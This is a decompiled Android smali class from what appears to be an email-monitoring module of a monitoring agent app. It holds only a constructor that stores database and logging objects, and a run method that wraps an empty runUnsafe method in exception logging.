.class public Lcom/hp/vd/module/monitor/email/EmailListerFrom60;
.super Ljava/lang/Object;
.source "EmailListerFrom60.java"

# interfaces
.implements Ljava/lang/Runnable;


# static fields
.field protected static final TAG:Ljava/lang/String; = "EmailMonitor::EmailListerFrom60"


# instance fields
.field protected context:Landroid/content/Context;

.field protected emailDao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/EmailData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field

.field protected log:Lcom/hp/vd/agent/log/IWriter;

.field protected moduleDao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/ModuleData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field

.field protected moduleData:Lcom/hp/vd/data/ModuleData;


# direct methods
.method public constructor <init>(Landroid/content/Context;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/agent/log/IWriter;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/data/ModuleData;)V
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/content/Context;",
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/EmailData;",
            "Ljava/lang/Integer;",
            ">;",
            "Lcom/hp/vd/agent/log/IWriter;",
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/ModuleData;",
            "Ljava/lang/Integer;",
            ">;",
            "Lcom/hp/vd/data/ModuleData;",
            ")V"
        }
    .end annotation

    .line 28
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    const/4 v0, 0x0

    .line 14
    iput-object v0, p0, Lcom/hp/vd/module/monitor/email/EmailListerFrom60;->context:Landroid/content/Context;

    .line 15
    iput-object v0, p0, Lcom/hp/vd/module/monitor/email/EmailListerFrom60;->emailDao:Lcom/j256/ormlite/dao/Dao;

    .line 16
    iput-object v0, p0, Lcom/hp/vd/module/monitor/email/EmailListerFrom60;->log:Lcom/hp/vd/agent/log/IWriter;

    .line 18
    iput-object v0, p0, Lcom/hp/vd/module/monitor/email/EmailListerFrom60;->moduleDao:Lcom/j256/ormlite/dao/Dao;

    .line 19
    iput-object v0, p0, Lcom/hp/vd/module/monitor/email/EmailListerFrom60;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 29
    iput-object p1, p0, Lcom/hp/vd/module/monitor/email/EmailListerFrom60;->context:Landroid/content/Context;

    .line 30
    iput-object p2, p0, Lcom/hp/vd/module/monitor/email/EmailListerFrom60;->emailDao:Lcom/j256/ormlite/dao/Dao;

    .line 31
    iput-object p3, p0, Lcom/hp/vd/module/monitor/email/EmailListerFrom60;->log:Lcom/hp/vd/agent/log/IWriter;

    .line 33
    iput-object p4, p0, Lcom/hp/vd/module/monitor/email/EmailListerFrom60;->moduleDao:Lcom/j256/ormlite/dao/Dao;

    .line 34
    iput-object p5, p0, Lcom/hp/vd/module/monitor/email/EmailListerFrom60;->moduleData:Lcom/hp/vd/data/ModuleData;

    return-void
.end method


# virtual methods
.method public run()V
    .locals 4

    .line 41
    :try_start_0
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/email/EmailListerFrom60;->runUnsafe()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    .line 44
    iget-object v1, p0, Lcom/hp/vd/module/monitor/email/EmailListerFrom60;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "EmailMonitor::EmailListerFrom60"

    const-string v3, "run(): Exception caught in runUnsafe()"

    invoke-interface {v1, v2, v3, v0}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    :goto_0
    return-void
.end method

.method protected runUnsafe()V
    .locals 0

    return-void
.end method
